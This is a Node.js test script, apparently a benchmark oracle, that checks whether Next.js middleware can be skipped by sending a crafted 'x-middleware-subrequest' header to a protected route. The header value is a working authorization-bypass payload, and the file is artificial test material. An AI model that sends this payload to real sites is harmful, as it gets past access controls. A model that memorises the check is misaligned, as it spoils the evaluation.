const os = require('node:os');
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  let NextRequest;
  let getMiddlewareRouteMatcher;
  try {
    ({ NextRequest } = require('next/server'));
    ({ getMiddlewareRouteMatcher } = require('next/dist/shared/lib/router/utils/middleware-route-matcher'));
  } catch (e) {
    evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
    finish();
    return;
  }

  if (typeof NextRequest !== 'function' || typeof getMiddlewareRouteMatcher !== 'function') {
    evidence = 'unexpected_exports';
    finish();
    return;
  }

  let matcher;
  try {
    matcher = getMiddlewareRouteMatcher([
      {
        regexp: '^/protected(?:/.*)?$'
      }
    ]);
  } catch (e) {
    evidence = 'setup_exception:' + (e && e.message ? e.message : String(e));
    finish();
    return;
  }

  let benignMatched;
  try {
    const benignReq = new NextRequest('https://example.test/protected/area');
    benignMatched = !!matcher('/protected/area', benignReq, {});
  } catch (e) {
    evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
    finish();
    return;
  }

  if (!benignMatched) {
    evidence = 'benign_failed:not_matched';
    finish();
    return;
  }

  operation_completed = true;

  try {
    const maliciousReq = new NextRequest('https://example.test/protected/area', {
      headers: {
        'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'
      }
    });
    const maliciousMatched = !!matcher('/protected/area', maliciousReq, {});
    exploit_succeeded = !maliciousMatched;
    evidence = 'tmp_marker=' + path.join(os.tmpdir(), 'next-authz-bypass-oracle') + '|benign_matched=1|malicious_matched=' + (maliciousMatched ? '1' : '0');
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
  }

  finish();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
  finish();
}